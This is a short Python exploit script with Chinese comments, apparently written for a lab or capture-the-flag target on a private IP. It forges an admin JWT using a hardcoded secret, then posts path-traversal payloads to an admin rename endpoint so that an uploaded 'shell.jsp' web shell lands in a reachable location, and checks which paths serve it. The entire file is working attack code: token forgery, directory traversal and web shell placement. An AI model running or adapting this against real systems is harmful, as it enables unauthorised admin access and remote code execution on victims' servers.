#!/usr/bin/env python3
"""
使用正确的参数调用 rename
"""

import jwt
import requests

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token  
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")

headers = {"Cookie": f"token={admin_token}"}

print("[*] 测试rename功能的正确参数\n")

# 基于javap的发现，参数应该是 oldPath 和 newName
rename_payloads = [
    {"oldPath": "shell.jsp", "newName": "../shell2.jsp"},
    {"oldPath": "shell.jsp", "newName": "../../shell2.jsp"},
    {"oldPath": "uploads/shell.jsp", "newName": "shell2.jsp"},
    {"oldPath": "shell.jsp", "newName": "shell2.jsp"},
]

for i, pl in enumerate(rename_payloads, 1):
    print(f"[*] 尝试 #{i}: {pl}")
    try:
        r = requests.post(
            f"{TARGET}/admin/rename",
            headers=headers,
            json=pl,
            timeout=5
        )
        print(f"    状态: {r.status_code}")
        print(f"    响应: {r.text}")
        
        if "ok" in r.text.lower() or r.status_code == 200 and "error" not in r.text:
            print(f"    [+] 可能成功！")
            
            # 检查新文件是否存在
            newname = pl.get("newName", "")
            test_paths = [
                f"/{newname}",
                f"/uploads/{newname}",
                f"/{newname.replace('../', '')}",
            ]
            
            for tp in test_paths:
                try:
                    r2 = requests.get(f"{TARGET}{tp}", headers=headers, timeout=5)
                    if r2.status_code == 200:
                        print(f"      [+] 文件可访问: {tp}")
                except:
                    pass
        print()
    except Exception as e:
        print(f"    Error: {e}\n")

print("\n[*] 如果rename成功，尝试访问移动后的文件")
